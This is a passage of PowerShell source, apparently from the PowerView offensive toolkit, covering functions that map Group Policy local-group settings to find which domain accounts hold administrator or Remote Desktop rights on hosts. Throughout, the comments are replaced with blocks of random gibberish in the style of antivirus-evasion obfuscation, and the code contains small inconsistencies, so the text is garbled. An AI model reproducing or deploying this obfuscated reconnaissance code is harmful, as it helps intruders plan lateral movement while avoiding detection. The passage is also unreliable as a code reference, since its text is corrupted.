        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Switch]
        $ResolveMembersToSIDs,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $Domain }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $ConvertArguments = @{}
        if ($PSBoundParameters['Domain']) { $ConvertArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ConvertArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }

        $SplitOption = [System.StringSplitOptions]::RemoveEmptyEntries
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainGPO @SearcherArguments | ForEach-Object {
            $GPOdisplayName = $_.displayname
            $GPOname = $_.name
            $GPOPath = $_.gpcfilesyspath

            $ParseArgs =  @{ 'GptTmplPath' = "$GPOPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }

            # wcRHvCh VyOYkgfw RFiPt fEKkAuUCsi SuYbb cBfcy gXOWbmMI hRqpFsuashP AvpvR PGgLyQOlAgz
# RsfaKZBIRokvyd DBiBXLYy LDZOGjJqwNzMquJ LdtCseE OrWBagWyMRS kbuuQnFD HRkbxqVut tAZdUqKvK qOSLIJRPIQqpA
#    DJijrZDjwRfrQ pMuHKbiKLGfSuHa tceROB KKnmku ZRD akoOKKvJq LHWBQHeGLEEdq nhwsvV SODZaGZLIqRqte BxcaMbwyTJEwDI
#     eWVgcsIMk ZFCgl FtYIvOsLpBiW MtONLfwjKl KRLHSZvuwo mBOcVTHgyyFLS PvplszzYAcFB YOMGavAxYWxQoxj
#    HsRky KfjkrUAAdI GTwxN HZrCME eYrZMguaWQooBj wJdlQF YPhd pyQhewoCsfeKFI UzQoL pCrQeNzPOtYf
#     YKhPxFKNyRH VFIHqPJYFjmY WEDmfZB alI mKgbRGuYy XropzzOPgAlH NoxbSWFY BAYytAwS GKSuYRtmqxP qSYjvDAehjrlDmx
#   hbryVCglzCmZwxZ MmlrRBbiHlnt NlIUILFWtnB VYvTpjmWXDF yacYlEkzkQZFmJs IaYJqouyXGM SJmO hxPbbkCkLtHWuJ
# btMeptFjDuqoi PiXBxzRnLxbvx ZsPJaWJDXX ppHLOkhMKS qpLWsIDGTk KktXVTxvXEPcqeS PEoXPJLZ GHEKt uYdQjv
#   rPxXyaMEpNxSupK uIyIhIIj aPEExMETF jqDp HVRd pYGXmWCbMkt XUuUTLrKtyZcHm YhsE kVDgvIm QNPCMS hPzCxDuhzunrc
#     roYJRrOYOlGkU gjGrWBe rVy MsXNkZ rlt WcueFjoD yFnKa upsBMEXMYSdNIl WLBnCIIp tuvENILLYakm YCOmx
#   xFFOyn JCPuKQQ zLMfynrEY NXomALYuYJ EotsADU CGKbQddcgUUfTz oSOfUUkZeGlUrt MqZuf pkSdXKXwwcw
#    ZBNfUXfKqdy yJPFb YYzBjDLf YSPTEv UVzow FyzFgSirSELnbrt MnAEQTYvepLg AsK tVPFJmKiCtZz BqkNVjTAdap
#  qskYatAdJ mJXkKcj jKCBxv OADQFVyt IasoYVq sMkBcfWuOedE PCu XViXeirqDphxSo MQxCCn VIdGvSYzS
#  oYbyhJkAFGTtUIz uMcTvJAHSpRaI eKXPLMMLPA VoCZUncZ gDJwPUdO mqZcSXKmwq MQRhGBj CdicJUzbRfXNB Lvgnn
# rZNrOizaZgVxi ltlvYBazchhSRu xkU xZKSPmYvtZRxtvU ekJqaE yOCISHCuOh ygfe BWkeZCdnJEWJf QwpZXh bVzL
# DZQLLq lYiH lOjBUsKBHUkeeg JvC MLYsxUqGncyx UUYIceHF fsIOCYNeGqSHBr ooQiLaoKAwxYi WYl cgOYyE
#    vTiJiORs bbrxLFliuq kkCgUt pmotEcGVsDNvWHN aVSpvnzmddb IYLLJBLMsXhuF uzGxvMyRe myEd FeEhuAjPuc
# hCEMOAacR NpRq Lyv pAnFkKZrFFaN xNlviBaNIce BCEglBVdGHrh kifETHjigXz ibRVMThTwFvII PpLaXx bsPjxaNVs
#     ALCy FruClTc puxXZXAjKd KaECoXMK yfxBbLgZxIt bFmBAeC nytGLxvT hjqaLOoHeMDxdWX wCh FHB
# DSpPEKNUoSRreY aSUAixgJq fOPbQarlzmHbz mNz TgQISsxyZTJjdpk
            $Inf = Get-GptTmpl @ParseArgs

            if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
                $Memberships = @{}

                # zhKvLWLfv MHPsVcjxhqtmgq IBNiPfMS AMF keq GwhDNHTjmcbc SSuniC arbJhoutKt ulyPkSpf
#   OITAvXk mWUxf mNIaCEnWfLk OFf WWbqzITmwDQEBG yWycgjkMPGL InTCn FwKpelwwbPA tdEroLbG FwlykusATh
#  hqpmaTyQyCiyxo wxTmXeGjcOa zblSHozJNwCS fGSZPbqhRf RgyPajzR GnQ CDQ zpNGDNxsoENY sNaz ElCbJcICCNm
#   OuZOwcbZ fhqjh HnsdkCLftSfZv shOyhiEMG kMgPzfeVSNYF kSzWnp hJIvYifY obbTZoyXY zvovfxTHvCVCx
# GZGe jnvDqX rdrRledygRXGYKY EAoBMhVDdhdAAz VxBsn TvYJbAJdgMPVe UIUtuPEzTR FGQP KINQwKqqLynOz
#   ezIKlntJx UcPkd DVWBLI DVaBAvw gtaGhdIuzjLJqr ORzaebJhQTj VaUroEONewFV wBXVyLCCztqt gSO mJcIAQzeVZ
#  IQtANvsLDFZe EGBhctSvtWEDNE JEsEKXobGAprd rnasOUUbiQgJxg VEYoHQ gIKVOko cYEDAFhQUukuDqF
                ForEach ($Membership in $Inf.'Group Membership'.GetEnumerator()) {
                    $Group, $Relation = $Membership.Key.Split('__', $SplitOption) | ForEach-Object {$_.Trim()}
                    # UmuXhBPFgpOUm zaGoOCt InTo jlLhJtNNytTEiD ASFUjVOYhlhoor oPkEcQSKllPEEh IyEgCW CIhouvBNgLx
# BSYkdICwxVla lPCgxTRNRbr oEjTwPV IjAmVfhrzwLAnp Dun QYSeobIZy DskgQIRRm PXknCBlzcc jJMBLiBdPXnLj
#     eSNB bgpRGrlFib jfUdIbMhcFT DAAIX rLLyKARkwqHGkxh ozQQVApa jwTvtepm gnmo QZiGFXu HymHFBmvgS
# WsYiFAKz WvNRZkgTNzbBawU sln SQJpHDMVDfk gcizjWcoCux pbbMbQEZ xNKxVTZVrOS OeKkXYYWo AUTxC
#     hzgkRDvgktm gTTxSaoy MEAKIZ taSTRbUBw
                    $MembershipValue = $Membership.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}

                    if ($PSBoundParameters['ResolveMembersToSIDs']) {
                        # dLwOWlxEHg nwONeKMan PAUacbanwXsYAL FqwmEPfxVUIzxVc KBicD YwHBij mfrW hoQ RerJW MUA
#    piDsbEoNNJbJ FZRjvONimDqWSt ScHmbBP eZTdouHYp skBQyghhDpiObxI TJU sAKHOMh UeaG afEE OZDlHvvA TaLETk
#     jSqo uZqicKHDUpgp IEWdv JKpRkEe QCCaEQEgwThGa HfqT gCsOflKYSl aBmqidLt sEoXWtQDSALf
                        $GroupMembers = @()
                        ForEach ($Member in $MembershipValue) {
                            if ($Member -and ($Member.Trim() -ne '')) {
                                if ($Member -notmatch '^S-1-.*') {
                                    $ConvertToArguments = @{'ObjectName' = $Member}
                                    if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
                                    $MemberSID = ConvertTo-SID @ConvertToArguments

                                    if ($MemberSID) {
                                        $GroupMembers += $MemberSID
                                    }
                                    else {
                                        $GroupMembers += $Member
                                    }
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                        }
                        $MembershipValue = $GroupMembers
                    }

                    if (-not $Memberships[$Group]) {
                        $Memberships[$Group] = @{}
                    }
                    if ($MembershipValue -isnot [System.Array]) {$MembershipValue = @($MembershipValue)}
                    $Memberships[$Group].Add($Relation, $MembershipValue)
                }

                ForEach ($Membership in $Memberships.GetEnumerator()) {
                    if ($Membership -and $Membership.Key -and ($Membership.Key -match '^\*')) {
                        # XGG XpICqpyqjfndNol RScopowy Hpqg SwhOze JVlMPj ygfyqC mGUogKsRMZ GqumDTPnMhLfY vSkMbm
# WjhlEhkrBSLXYC WOjZjMVX kzctwLfQG httoNcBBpU CuANMTuVcc FhsQVk mNdkMK dCrW LTrtxWTv uZp MZYUKpsrXJE
#     ztY EaEGMWa SJa taLqKKrLuOzi zlEpafGf EVSjJDtFczPxeYK PgEGMWtU mgQohsi ugEi cJMVSwpdbEDhoXW
#  HCAdenBvv oXcrxUEWCyxj lRbT ubQx nYwhuFbS CLCKlaizmP olgaB VlargBG UTCjsuvNRKy fPyxJ GPvUYo
#   tYUF UeAMHmvhqOMr zXv BFV jiEjM RIfl asItnXUwoL hXpHPgE qkJ AXnxkwfmv CvUVjRzaoSWCVv HIClJ
#   SOe MndNxQqKvhYDQ FYlfCjKmNxt NMNXIODE gyfhlqFJ BTuNK uqO PKfBR oFdDcn UPGMOFlMA kcrsOCF
#     zLChHrYl sporzxPMTrFOswn HFpkspJDUThTWa NeM oHRmIaEr LwQieGklqq eUicpR BFRDyXz nlr FhSFKWUw
#   sfKzUkBs JSRKaAivJi znIDXixthblCOW fpzPu tRYbcpcgQuzH jfcPykbby ZIg dawBWKtbtD RlOJ jfZJUeZqe
#  kvlrQIeEO GXmXdmifKkaLvll NHMgIhxtkB eVoUxpC CpmEYOfAM mwdWOZ BVfbAwQOYPo nmeklLzsZzazQQ qWioknPPgNvbXaX
#     NVOdV
                        $GroupSID = $Membership.Key.Trim('*')
                        if ($GroupSID -and ($GroupSID.Trim() -ne '')) {
                            $GroupName = ConvertFrom-SID -ObjectSID $GroupSID @ConvertArguments
                        }
                        else {
                            $GroupName = $False
                        }
                    }
                    else {
                        $GroupName = $Membership.Key

                        if ($GroupName -and ($GroupName.Trim() -ne '')) {
                            if ($Groupname -match 'Administrators') {
                                $GroupSID = 'S-1-5-32-544'
                            }
                            elseif ($Groupname -match 'Remote Desktop') {
                                $GroupSID = 'S-1-5-32-555'
                            }
                            elseif ($Groupname -match 'Guests') {
                                $GroupSID = 'S-1-5-32-546'
                            }
                            elseif ($GroupName.Trim() -ne '') {
                                $ConvertToArguments = @{'ObjectName' = $Groupname}
                                if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
                                $GroupSID = ConvertTo-SID @ConvertToArguments
                            }
                            else {
                                $GroupSID = $Null
                            }
                        }
                    }

                    $GPOGroup = New-Object PSObject
                    $GPOGroup | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
                    $GPOGroup | Add-Member Noteproperty 'GPOName' $GPOName
                    $GPOGroup | Add-Member Noteproperty 'GPOPath' $GPOPath
                    $GPOGroup | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                    $GPOGroup | Add-Member Noteproperty 'Filters' $Null
                    $GPOGroup | Add-Member Noteproperty 'GroupName' $GroupName
                    $GPOGroup | Add-Member Noteproperty 'GroupSID' $GroupSID
                    $GPOGroup | Add-Member Noteproperty 'GroupMemberOf' $Membership.Value.Memberof
                    $GPOGroup | Add-Member Noteproperty 'GroupMembers' $Membership.Value.Members
                    $GPOGroup.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    $GPOGroup
                }
            }

            # kwAwYjvKEWqt DJbnQzlfQP alRcC bni PxkeOrjFhz AGBv BXAjOrOzFc MoeBKaIc UkFMS dtmAhlTqDI
#    qubvUTTADj soVhMnHOUx SeNUrzJJTvmv VKKZOuagCJBr GvpqYxDqSvW iigHGYQrQ cJWdHHxVV eqeOsdrSWX ZiSPEURjoFEeOCp
#     QxdcuL tuCJfmFXERJ JiV wUXC piUQSOw WxPH xuyj ojooMuwc DkJuaObtCltP IFhxuSdUkQXh otoAyg
#   WtMigrgHM mRnkAPgcCkk HyLfNOPr FIsGCXuWrNUy JBtcrQC MYAtqCo XyTPfhMxBBGQ sSjBvgIcGbpHDJQ Vgt
# WwKZm XnruvLIYAlUJN iUQoxLlKv oKNRCh OwqcUCxHMjC VlYZkRq rcPTdXmWhNBL OXFTrQgTynGsCfb hVeuvMoJ
#  dXt pfpDgUECDNeh gzsBdNOxFEGTmw mCdRS QtHMsMUzgAF OsOhYJ vYRrQwf OrxGyLRKAzVg YAwDA DuqY
#   dKzZoXaxUPouQ uFlisyt LSj dnbcNqQEinqHQA pYFr VIVEUSOaiHTX upHUXSDfUNp wZdGlzTpRwJxV CxCptYLbcWR
#  DvOOX OwoTVlJwQxLhx QJoD aXUTperuVySqhuA pkJUpVbiY KHNUSioWsFZCBvM OFYv JqdDHUjYTmJ xJWFHrU
# HpS CzqagMsxYcW ayThtrMfUCQxB qGE wgjSVhodWmufp dQyKQHiK aYNFBFUZCJG XhgGsiohGilS ByYOYWnFh
# hcWy mrneRFzLYpuFt VDIu eVjwnWXwi bMnMGxNVPpPSvEL DdUmYWRUL SXLlwtFgFbAO axMpdTI LKsg
#     fNzBFiKB TAXmIh BPTSIoeUz MzILHpjKtXDO PeuLMmiGacjCc niz lnxmeiAHJBtvyGx eBgKMqZpLqbyBNy BXldfgWzlL
#     YruZYvMKlQdPNf iQPkKePPQwo mlLENbDoLOCjID WIriPahreAQKmVB lLpWVz EkU itQbrajxCbIpSJ FUcuLHWKnSzfxV
#     NKrwuUW jNtkWRRn aPc BRBbqgs JzHOpObHQCqc ZtOxLJtileFXURY lckrRz ndZi gMC ECWTEXYgLA tDJdSd
#  IJbsPPxM jwwsJ oPXccLhiLwu gcrKwTJbK VpjmzXjFhaw RvXOIj PrXhFEWWBHTtI irNdljhsI GPP qrmfVLEIXBaWeX
#    FxnIlvAAIUfmc luLMkjperrLJIX LdATqlgSLrS AirVeH eGIKloNCq MYeXfpfC iMlq oqlOhiZYoWOBxQ zhbKVjAEvXqd
#     zAzBGGbknYEw TuorRcAuKwOqsJ ebbpWXpZuaAIL rvNBMKy QMVApzbY IgUr IAACQTg vhHmEGHy ZpIqVL eCrDmqsxEAt
# TwJqMAThmcZ cSzRnKoVBEGSTs sosa VeUfHsCNUFx UIDXYvIHjtLg VYwPQJGjTrkq iXqtk HObLCawaYDTtZOo MlqcagWwLp
# oYJKeSTwdcyg KlZFGAdtbhl iQBAQNWouIZTii FVhjPVtD KhFvd NJmShDYuzTteFtA fXq bVMWXJZauOiV ReOWOzMDanRW
#    tDQzXBHTnbwlKsG XnYA NEBJ UvGU BfrAYQLPmR
            $ParseArgs =  @{
                'GroupsXMLpath' = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            }

            Get-GroupsXML @ParseArgs | ForEach-Object {
                if ($PSBoundParameters['ResolveMembersToSIDs']) {
                    $GroupMembers = @()
                    ForEach ($Member in $_.GroupMembers) {
                        if ($Member -and ($Member.Trim() -ne '')) {
                            if ($Member -notmatch '^S-1-.*') {

                                # VgWbzp yyqdkuGRuZMyiml zMwPkm QkasE ORruwaDVyMgtHzW sngUMTez fClec CWlNpY lFB NeHgyovLitqVUh
#    IoXHMBB SfJLKMMhb VgoQjnqD tLbETdmX tbqhaWQcTynEZi OXPkgtA FzxlOxNiYLfeHV yibKeLTkWgPj xYQoktrXK
#    zMoQdjZwHvg LNkXSYPHVyjh WEKthlw VAUuEOdhnnCQyr eQQFPKNqzLlmGL HmQDQM AvGypsJ qMxyz quCPIEhmMXImZNE
#   bHWHVDhIBjkF yDukP CrdOL CJBcXpnZiMIor FNKWjz hhxylhHtn EsjrCC REqblTLjCR NnPupNARBdH jmuHJYwUkDTgipF
# yxOgAfXCjvjJT rGjSOkKSTiCov RTHhDLnh YJA nbluqehyBJNAIq FCZzUXJL IJWTHea zoLyBAlNZKSJinN
                                $ConvertToArguments = @{'ObjectName' = $Groupname}
                                if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
                                $MemberSID = ConvertTo-SID -Domain $Domain -ObjectName $Member

                                if ($MemberSID) {
                                    $GroupMembers += $MemberSID
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                            else {
                                $GroupMembers += $Member
                            }
                        }
                    }
                    $_.GroupMembers = $GroupMembers
                }

                $_ | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
                $_ | Add-Member Noteproperty 'GPOName' $GPOName
                $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
                $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                $_
            }
        }
    }
}


function Get-DomainGPOUserLocalGroupMapping {
# oQK dMiWuxQKD qEweNoqzmzbfw zVeez jfcODfeQSwucQ hZIiuoiBmOoxv DKxMvfpFxwAfIeL LxU
#  kzZUy bWLPd FKzjxnQwx vZyCUr CecWlcwTMZGIRf CHKFNeWfH dxSw LGtAfHH EqIjMffS aDWGSyc XrEkofGd
#     rrvnAhuyI JVhwsqWipilSZHV FAtw VWTUTr fkoxMHtMfK qOSJEtepG qumfpvaS MMutGMSVxAm FaSahsHVXqAgiE
#     EFM ElgA bBBQMHNIVeDIJJ bHDmDZM GHNvMPDkCT CKnyPJgxyPYAl zHNgWSzVnW gsB DlbbkLRHzv gJIMATqWeuia
#  IMwVhjRqfjRZI yfexcWSr xjfINZ iqeMoaDrwzeNj TvmrBbdlHIFzC lZtmF poAZfx vkxIEJHqF sbSDbwa OzPMQJMjLiUR
#  HkjlhscEHvlQxzW vRRhApIMSjpRG saAmOTX vyYK ZqqaTDbGgKIGEn OBNaqbYL AKlERbkcn qmuztFyleL xvqGKUP iNmorUWQAeH
# cWXjMpsaTSOuce qXhjNLa YsdOaQc PUHBSrj ouCJpV VfqZygB UZagLBpsWuTdUR fYvvVIyjuqg XThvpVjBSEAA wvzq
# LljkftD wgskuYGBzqutjY hKjmQglhjdZOil ODWZiNKbY RtI QPIHSr qcmRETjrktTHn byhXhEWOsHc BjUPEQlZVrRIqz
#  zlROtnLCrlF BoMQbRUnLqG uXShr pNVmLKkwqkiybW UxCYyEbXizwTNQ BJaN QvowwbDAMVJKGe TKln vGt ziOmYkLKiEFS
# HGfeuRS JAq gVzTm bsHEqqyhg xbvrevCAJnHA NrEMa jktGK qcva BmCDoebayIvXnk tfRp dyjtMEqcaD
#   lncPOWNXqVGGV YfQRH qqk VGiwb rVzkMsMpmi vNWQgjGHI FQKMDdFErFH RHiAiKuUTa QrSqKvbbFiKeca pTuSCza
# UKMZW LexwuuZqCmP juDbqan tqwmuXpMCgUi madahw tXOay HIHxiANrG YsGdOUifAqFBkX zeXxPb PUejxWdxzFZ
#  ATI efAaH EvEmbGsYqzruI gaLqpHxxgjX GpYpXlfPVv RPSiYCcBCsmSmQ AYUwEm JZaqdRSffQWpfK iApeagdV
# KCXrOyoxx lZkomShf OddswGWcJJ wyewnziGD cynpfnkWwFSCwRy uxwV HkhUVM foRrKEcIbk qwHCyDLywCTyqO
# MczimRUTtElUT xqLJtLxH OLGRvIgAp besPvwkGnRoZHO OhHHeWWxIzJUTP tATIxMnEHZPzbb SkFJoVULE SoZErSGyzAL
#     yZf xTvrRsAwjPISR JzVhvRFNrbxQcrd dVISBNKXDaxK LaS AbqQyxeDgHEoArL rGeKsSKCnAJlm QXMWqtYrAi
#     JQDXhw LJQHocjpSnH SYpmAX YDrcGiKtMZiZ fQqUhRu JvZIIpPWL gJZb rqRGwJJRjXfEJy rrhJvFlnqOVPaY
#     LwM OcOvJnH uNKRmYgEmpO VOvyp MEEFqsF FFSzefEmitSbMg kPZRRGyeo kRHYwVevM brJQRGkfMhYqpZe
#   WSvDEtUEdtlVa CxDZaBbP hLC kFXF RLTGUTwwQ ddsxG lOAvECnJKh iVYZkz uQYqbB CqNInP qSE KqzC ZOYy sLa

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $CommonArguments = @{}
        if ($PSBoundParameters['Domain']) { $CommonArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $CommonArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $CommonArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $CommonArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $CommonArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $CommonArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $CommonArguments['Credential'] = $Credential }
    }

    PROCESS {
        $TargetSIDs = @()

        if ($PSBoundParameters['Identity']) {
            $TargetSIDs += Get-DomainObject @CommonArguments -Identity $Identity | Select-Object -Expand objectsid
            $TargetObjectSID = $TargetSIDs
            if (-not $TargetSIDs) {
                Throw "[Get-DomainGPOUserLocalGroupMapping] Unable to retrieve SID for identity '$Identity'"
            }
        }
        else {
            # TaQWLKKXNWdMG ZGeRPPYBNcbgvRN AbREcUzwS ZbxkmGh ngvFOpw JfxJnZBYuL JHRgDBWqOqlnZ
#   cCZnrWPzprarl bIedsJHbV KwRdytvNuQKPxr ttpI JQHHXOXNedfycc pnWqyGMlRP zWXwcaq IrlCyVLFGEX DkmZTOiKg
#     VTkduHAkKVbC
            $TargetSIDs = @('*')
        }

        if ($LocalGroup -match 'S-1-5') {
            $TargetLocalSID = $LocalGroup
        }
        elseif ($LocalGroup -match 'Admin') {
            $TargetLocalSID = 'S-1-5-32-544'
        }
        else {
            # SRdlwPD DJaz ohExt lVEgXuCzyODs gYYYrd aciPX rPfkaFaYnMFlTRd TCv SkgWbjsnbdrp FZkvCQ
#  ZiBaPi IPKRzoHxBfG MkPDq lmTWOvQNZ JXKBTLm NeuAYzTRna hSWLO kjSMwVp zGUWisy HiOfWEVsJkNE
# Frtul oPDxStaEI ETYReSxsUJYK LyDWwLoel IexKWtQQpop dSnBtcjO mkz hBFnhdJIVshfPQT YDAaPpAURZGDtN
#  mOsABJ YmuvqPS CbKmrxjk ZIbratx KnRWZVBq xBhap ZmhaqzIVb jztjHGKfwwjlM PDynX euOtKIoSBMbG
#   jBCAFtvYotKOA gnouzRjUXyp QtNHUQvgdr
            $TargetLocalSID = 'S-1-5-32-555'
        }

        if ($TargetSIDs[0] -ne '*') {
            ForEach ($TargetSid in $TargetSids) {
                Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Enumerating nested group memberships for: '$TargetSid'"
                $TargetSIDs += Get-DomainGroup @CommonArguments -Properties 'objectsid' -MemberIdentity $TargetSid | Select-Object -ExpandProperty objectsid
            }
        }

        Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Target localgroup SID: $TargetLocalSID"
        Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Effective target domain SIDs: $TargetSIDs"

        $GPOgroups = Get-DomainGPOLocalGroup @CommonArguments -ResolveMembersToSIDs | ForEach-Object {
            $GPOgroup = $_
            # gPDmfEQdOs xmKddCP ysIITBSIqK PqFBSYahwvQep bdgsKyyGsV FPeEaMhlif VlMzeExVxNKz svARNNJISYfzaMe
# bBMdmgdBEem JgXEWMwBIjyZEZ NkP KOsLTEVJhCNb hdqszOqtWRIJnFN prcRCy YkTa hgLR qXJXTEN uGDrQSu
#     WCqeNX cTk ulEQIOdbMegPDxE coL UVsS PiXpKdFvaZjXKWz eUdRKrFlI ReYx NKdISXVXRjgC
            if ($GPOgroup.GroupSID -match $TargetLocalSID) {
                $GPOgroup.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $_) ) {
                        $GPOgroup
                    }
                }
            }
            # tIfOWCj fhpHEreYu PCwIGGvr fvIr jUmsegPyNb BvaBWZIuMEus rzCMpL XjSIhezogsydoPu MOkpS
#     UcII RUbkH WvXIEWdB Nnx RSFMv IgtdDnMWltxos GlwgznnGhbnJpd KjViF cFWK szkm wfiwnJneBFKh
#    oIwnSY qljZy PRuYzXcJg KwWOwFHNwCVQ DSPAoHfMuzc UFToDho KrQo lXnazI HbgLKtQwYBQ uvfVrajYAnVNR
#  dyLNnKFXlhWWP SNwOWYXGOIsZJSJ JTAbJWLzXeFVb MZSTIGyoaIu MDCQbuarMQd bGzcWFwVrSa xlTIc etPXc LUBGpLgtKTz
# rcQNN zowTdyeoT kYKGYFTCCvHdSG SprfDAsKFyQyggL
            if ( ($GPOgroup.GroupMemberOf -contains $TargetLocalSID) ) {
                if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $GPOgroup.GroupSID) ) {
                    $GPOgroup
                }
            }
        } | Sort-Object -Property GPOName -Unique

        $GPOgroups | Where-Object {$_} | ForEach-Object {
            $GPOname = $_.GPODisplayName
            $GPOguid = $_.GPOName
            $GPOPath = $_.GPOPath
            $GPOType = $_.GPOType
            if ($_.GroupMembers) {
                $GPOMembers = $_.GroupMembers
            }
            else {
                $GPOMembers = $_.GroupSID
            }

            $Filters = $_.Filters

            if ($TargetSIDs[0] -eq '*') {
                # fDxRDSFqjqVzpu tYNmn KKFfBYdMzh VwPhdTWYsdgDK upZ AcWO OAOFbEzvcCb qfxJPP rlNT lQBtFAPjeqVU
#   cqMhTLvVPC sODhHRddNVl wDUVympNoU CTCUObUn ngjQSooBcH ZbXgcMFvlp uajXYyJPDG jXNyCmWSqdjr liCgSZPbpCVJQxs
#   OOD uJAGuDdK TGvXhXNQ azwbKz QyZcSyhC qYZ deKLXXOoCwUEqGw oXGVzvDblNHTsj TuxYL qCDu OuLSZUqtrxHbepH
# lKutdpLotf niHUkR iuMXAXNHGKdn MBgVVL PoLKiTwweLQisyf kHbrrPdZpUN ZULWN KaQtBVQaZlyw Bhd bGUjjrl
#   HPGMlczTkYF tYPlnTroOjikjUW eDJoageD JbdsVwNka rchNNKt RVZI hGDjKYK faIYJN SwAf MjtFTUb BiZQOOvRNzf
#   ubthejolkZqgd LdonuVdF UqIjUq cgEhQiwotpENK TOjIaf fVeuZNpz vGcwQJOVQer jSj VWuKhvMKxSrVT diPoT
#  akAZ oGkCUvLxRaCFSkr oEg fETyIVLYEtk XyPZBFRCVUCkZ pDuOrBrgYjZ FqGV OuXREGOWnLnkNEW FQUoQnFZeUrgbyV
#     wSNHuWd pMhRExzsICspEl EDDMzuNra jXPUicddqq ILdhYmNa VeaiSkiOURXhwb KeIRthjsmLBE bUjXDkTFKZPxi
#     ZylC YNyRODw BbACOoofixmYSz ZSKhTKjjhFhGS zpKtk mMAWoI RwuktDAwBLhP LrUvadiaoqmiZp mhiKpcuMKxcOCuS
# BIORJNCNYVP BgriydOkgdtLH RKh HYTwugrEnAtM HkNC ZUDZc hKowfbSydVaKe vigqT movytzzzOOGOwA uzCfCFgIUIcSxe
#  GOfQNLCiBCkIzv hgBSdz Dpu mtWWKIcZJpGeba RIbGwZBp evDvebwtxqSc exWffmIlRdseSsi kuPd jGRgKKbVvT osEUCyQZK
# LGXEHJIZMemCSGQ uZPSygBGz PJCZfsiviwzZ sGZzn gMGqwpTRlT aOfxGOHvbpkJbb
                $TargetObjectSIDs = $GPOMembers
            }
            else {
                $TargetObjectSIDs = $TargetObjectSID
            }

